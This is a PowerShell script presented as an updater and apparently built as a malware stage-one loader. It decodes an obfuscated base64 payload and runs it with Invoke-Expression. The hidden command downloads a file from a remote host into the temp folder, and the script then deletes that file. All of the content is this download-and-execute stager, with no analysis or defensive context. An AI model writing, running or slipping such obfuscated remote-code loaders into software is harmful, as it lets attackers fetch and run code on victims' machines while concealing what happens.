
<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [int]$TimeoutSec = 71
)
$EncodedStage = (
    'JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAu' +
    'AG4AZQB0AC8AdQBwAGQAYQB0AGUALgBkAGEAdAAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIA' +
    "ZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABTAHQAYQBnAGUAMgBVAHIAbAAgAC0ATwB1AHQARgBp" +
    "AGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAMgAuAGIAaQBuACIAIAAtAFUA" +
    "cwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAA=="
)
$PayloadText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedStage))
try {
    Write-Verbose ("Decoded stage length: " + $PayloadText.Length)
    if ([string]::IsNullOrWhiteSpace($PayloadText)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $PayloadText
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
